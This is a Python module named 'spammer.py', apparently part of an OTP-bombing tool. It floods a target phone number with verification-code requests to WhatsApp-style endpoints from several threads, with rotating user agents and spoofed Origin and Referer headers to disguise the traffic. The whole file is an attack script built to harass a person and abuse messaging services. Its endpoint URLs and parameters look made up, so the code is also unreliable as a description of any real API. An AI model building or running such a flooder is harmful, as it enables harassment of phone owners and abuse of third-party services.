# spammer.py - OTP Spam Engine

import requests
import time
import random
import threading
from colorama import Fore, Style
from config import USER_AGENTS, TIMEOUT, DELAY_BETWEEN_REQUESTS
from utils import format_phone, print_status

class OTPSpammer:
    def __init__(self, threads=5):
        self.threads = threads
        self.stop_flag = False
        self.results = []
    
    def _get_headers(self):
        return {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9",
            "Origin": "https://web.whatsapp.com",
            "Referer": "https://web.whatsapp.com/",
        }
    
    def _send_wa1(self, phone):
        try:
            url = "https://web.whatsapp.com/send"
            data = {"phone": phone, "type": "otp"}
            r = requests.post(url, data=data, headers=self._get_headers(), timeout=TIMEOUT)
            return f"WA1: {r.status_code}"
        except:
            return "WA1: FAILED"
    
    def _send_wa2(self, phone):
        try:
            url = "https://business.whatsapp.com/request"
            data = {"phoneNumber": phone}
            r = requests.post(url, json=data, headers=self._get_headers(), timeout=TIMEOUT)
            return f"WA2: {r.status_code}"
        except:
            return "WA2: FAILED"
    
    def _send_wa3(self, phone):
        try:
            url = "https://web.whatsapp.com/qr"
            data = {"phone": phone}
            r = requests.post(url, data=data, headers=self._get_headers(), timeout=TIMEOUT)
            return f"WA3: {r.status_code}"
        except:
            return "WA3: FAILED"
    
    def _send_wa4(self, phone):
        try:
            url = "https://api.whatsapp.com/v1/send"
            data = {"number": phone, "message": "verify"}
            r = requests.post(url, json=data, headers=self._get_headers(), timeout=TIMEOUT)
            return f"WA4: {r.status_code}"
        except:
            return "WA4: FAILED"
    
    def _send_all(self, phone):
        results = []
        results.append(self._send_wa1(phone))
        results.append(self._send_wa2(phone))
        results.append(self._send_wa3(phone))
        results.append(self._send_wa4(phone))
        return results
    
    def _worker(self, phone, rounds, thread_id):
        for i in range(rounds):
            if self.stop_flag:
                break
            results = self._send_all(phone)
            for res in results:
                if "200" in res:
                    self.results.append(("[SUCCESS]", res, thread_id))
                else:
                    self.results.append(("[FAIL]", res, thread_id))
            time.sleep(DELAY_BETWEEN_REQUESTS)
    
    def spam(self, phone, rounds=10):
        """Multi-thread spam"""
        phone = format_phone(phone)
        print_status("info", f"Target: {phone}")
        print_status("info", f"Threads: {self.threads} | Rounds per thread: {rounds}")
        print_status("info", f"Total requests: {self.threads * rounds * 4}")
        print("")
        
        self.results = []
        self.stop_flag = False
        
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self._worker, args=(phone, rounds, i+1))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor progress
        total = self.threads * rounds * 4
        start_time = time.time()
        
        try:
            while any(t.is_alive() for t in threads):
                progress = len(self.results)
                print(f"\r{Fore.CYAN}Progress: {progress}/{total}{Style.RESET_ALL}", end="")
                time.sleep(0.5)
            
            print(f"\r{Fore.CYAN}Progress: {total}/{total}{Style.RESET_ALL}")
            
            # Summary
            success = sum(1 for r in self.results if r[0] == "[SUCCESS]")
            fail = total - success
            elapsed = time.time() - start_time
            
            print("")
            print_status("success", f"SUCCESS: {success}")
            print_status("error", f"FAILED: {fail}")
            print_status("info", f"Elapsed: {elapsed:.1f}s")
            
        except KeyboardInterrupt:
            self.stop_flag = True
            print_status("warning", "Stopped by user")
